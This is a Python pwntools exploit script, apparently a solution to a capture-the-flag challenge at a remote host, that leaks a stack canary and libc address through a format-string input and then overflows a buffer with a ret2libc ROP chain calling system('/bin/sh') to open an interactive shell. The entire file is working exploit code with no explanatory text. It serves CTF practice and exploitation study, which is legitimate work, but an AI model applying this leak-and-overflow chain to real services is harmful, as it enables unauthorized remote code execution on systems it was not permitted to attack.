from pwn import *

context.binary = elf = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = "info"

HOST, PORT = "chall.nypinfosec.net", 8004
DELTA = 0x211643  # from calc_delta.py

def main():
    io = remote(HOST, PORT)

    # Stage 1: leak canary + libc pointer (single short string fits 0x10)
    io.recvuntil(b"What is your favourite pokemon?\n")
    io.sendline(b"%9$p|%1$p")

    io.recvuntil(b"I see you like...\n")
    line = io.recvline().strip()
    canary_s, leak_s = line.split(b"|")

    canary = int(canary_s, 16)
    leak = int(leak_s, 16)

    log.success(f"canary = {hex(canary)}")
    log.success(f"leak   = {hex(leak)}")

    libc.address = leak - DELTA
    log.success(f"libc base = {hex(libc.address)}")

    # Stage 2: ret2libc
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0]  # alignment
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    log.info(f"pop_rdi={hex(pop_rdi)} ret={hex(ret)} binsh={hex(binsh)} system={hex(system)}")

    payload  = b"A" * 0x20
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    io.recvuntil(b"Tell me more about your pokemon\n")
    io.send(payload)

    io.interactive()

if __name__ == "__main__":
    main()
